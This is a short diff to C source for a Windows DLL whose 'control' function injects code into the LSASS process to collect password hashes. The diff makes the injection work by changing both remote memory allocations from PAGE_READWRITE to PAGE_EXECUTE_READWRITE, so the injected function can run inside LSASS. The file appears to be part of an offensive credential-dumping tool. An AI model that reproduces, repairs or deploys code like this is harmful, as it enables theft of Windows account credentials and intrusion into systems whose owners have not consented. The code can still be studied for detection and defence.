@@ -512,7 +512,7 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 		if (setArgs(&InitFunctionArguments, dwMillisecondsToWait)) { dwError = 1; break; }
 
 		/* allocate memory for the context structure */
-		pvParameterMemory = VirtualAllocEx(hLsassHandle, NULL, sizeof(FUNCTIONARGS), MEM_COMMIT, PAGE_READWRITE);
+		pvParameterMemory = VirtualAllocEx(hLsassHandle, NULL, sizeof(FUNCTIONARGS), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		if (pvParameterMemory == NULL) { dwError = 1; break; }
 
 		/* write context structure into remote process */
@@ -521,7 +521,7 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 		dwBytesWritten = 0;
 
 		/* allocate memory for the function */
-		pvFunctionMemory = VirtualAllocEx(hLsassHandle, NULL, FunctionSize, MEM_COMMIT, PAGE_READWRITE);
+		pvFunctionMemory = VirtualAllocEx(hLsassHandle, NULL, FunctionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		if (pvFunctionMemory == NULL) { dwError = 1; break; }
 
 		/* write the function into the remote process */
